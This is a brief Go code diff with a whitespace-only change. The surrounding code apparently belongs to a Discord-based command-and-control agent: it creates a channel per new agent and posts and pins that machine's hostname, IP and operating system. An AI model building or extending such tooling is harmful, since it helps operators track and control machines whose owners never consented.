@@ -58,7 +58,7 @@ func main() {
 	}
 
 	channelID, _ = dg.GuildChannelCreate(constants.ServerID, newAgent.IP, 0)
-
+	
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
 	dg.ChannelMessagePin(channelID.ID, message.ID)
